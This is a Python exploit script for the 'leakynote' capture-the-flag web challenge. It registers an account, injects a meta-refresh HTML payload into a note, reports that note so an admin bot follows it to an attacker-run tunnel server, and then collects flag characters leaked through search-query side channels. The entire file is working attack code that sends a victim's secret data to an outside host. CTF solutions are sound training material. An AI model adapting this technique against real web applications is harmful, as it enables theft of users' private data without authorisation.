import os
import secrets
from urllib.parse import urlparse, parse_qs

import requests
import tunnel


class Challenge:

    def __init__(self, url) -> None:
        self.url = url
        self.session = requests.Session()

    def _(self, path):
        return self.url + path

    def register(self):
        a = self.session.post(self._("/register.php"), data={
            "name": secrets.token_hex(16),
            "pass": secrets.token_hex(16)
        })

        assert a.ok

    def load_exploit(self, tunnel_url: str):
        # payload is meta redirect
        payload = """<meta http-equiv="refresh" content="0; url={}">""".format(tunnel_url)

        a = self.session.post(self._("/index.php"), data={
            'title': secrets.token_hex(16),
            'contents': payload
        }, allow_redirects=False)
        post_id = a.text.split("<li><a href='/post.php?id=")[1].split("'>")[0]
        a = self.session.post(self._('/report.php'), data={
            'post_id': post_id
        })


'''
1. Send bot to attacker controlled server
2. Open all links like
    2.1 /search.php?query={guess}{try}
3. Check all links and get the visited one
4. Profit
'''
URL = os.environ.get("URL", "http://leakynote.challs.teamitaly.eu")
if URL.endswith('/'):
    URL = URL[:-1]

with open(os.path.join(os.path.dirname(__file__), "exploit.html"), 'r') as f:
    exploit_html = f.read()

with open(os.path.join(os.path.dirname(__file__), "poc.html"), 'r') as f:
    poc_html = f.read()

c = Challenge(URL)
c.register()

with tunnel.open_http_tunnel(tls=True) as t:
    c.load_exploit(f'http://{t.remote_host}:{t.remote_port}')

    while True:
        _, path, _, _ = t.wait_request()
        path = urlparse(path)
        query = parse_qs(path.query)
        if path.path == '/':
            t.send_response(200, {'Content-Type': 'text/html'}, exploit_html.replace('{{CHALLENGE_URL}}', URL).encode())
        elif path.path == '/poc':
            args = query.get('url')[0]
            t.send_response(200, {'Content-Type': 'text/html'},
                            poc_html.replace('{{CHALLENGE_URL}}', URL).replace('{{url}}', args).encode())
        elif path.path == '/leak':
            t.send_response(200, {}, b'')
            flag = query.get('flag')[0]
            print(flag)
            if flag[-1] == '}':
                break
        else:
            t.send_response(404, {}, b'')
